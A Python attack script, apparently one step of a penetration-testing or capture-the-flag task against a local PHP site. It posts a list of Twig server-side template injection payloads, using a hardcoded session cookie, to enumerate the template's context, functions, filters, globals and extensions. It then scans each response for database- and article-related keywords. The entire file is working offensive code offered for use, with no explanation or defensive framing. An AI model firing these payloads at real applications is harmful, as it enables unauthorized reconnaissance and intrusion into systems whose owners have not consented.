import requests
import re
import urllib.parse

# Target URL and session cookie from previous tasks
target_url = "http://127.0.0.1:8080/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

# SSTI payloads for enumerating data sources and environment
payloads = [
    "{{_context|length}}",
    "{{_context|keys|first}}",
    "{{_self.env.getFunctions()|keys|join(',')}}",
    "{{_self.env.getFilters()|keys|join(',')}}",
    "{{app|keys|join(',')}}",
    "{{request|keys|join(',')}}",
    "{{_self.env.getGlobals()|keys|join(',')}}",
    "{{_self.env.extensions|keys|join(',')}}"
]

# Keywords to identify article/database related functions
article_keywords = ['article', 'post', 'inventory', 'db', 'database', 'orm', 'entity', 'model', 'find', 'get', 'list']

# Prepare session with cookies
session = requests.Session()
session.cookies.set('PHPSESSID', session_cookie)

print(f"Target: {target_url}")
print(f"Testing {len(payloads)} SSTI payloads for article-related enumeration")
print("=" * 80)

# Test each payload
for idx, payload in enumerate(payloads, 1):
    print(f"\n[TEST {idx}/{len(payloads)}] Payload: {payload}")
    print("-" * 80)
    
    # Prepare POST data
    data = {'name': payload}
    
    try:
        # Send POST request
        response = session.post(target_url, data=data)
        
        # Print response details
        print(f"Status: {response.status_code}")
        print(f"Content Length: {len(response.text)} bytes")
        print(f"\nFull Response:\n{response.text}")
        
        # Search for article-related keywords
        found_keywords = []
        for keyword in article_keywords:
            # Case-insensitive search
            if re.search(keyword, response.text, re.IGNORECASE):
                found_keywords.append(keyword)
        
        # Highlight findings
        if found_keywords:
            print(f"\n[!!!] ARTICLE-RELATED KEYWORDS DETECTED: {', '.join(found_keywords)}")
        else:
            print(f"\n[-] No article-related keywords found in response")
            
        # Check for template remnants (indicates filtering/sanitization)
        if "{{" in response.text or "{%" in response.text:
            print("[!] WARNING: Template syntax appears in response - possible WAF/filtering active")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")

print("\n" + "=" * 80)
print("[ENUMERATION COMPLETE]")
print("Review responses above for article-related data sources and functions")
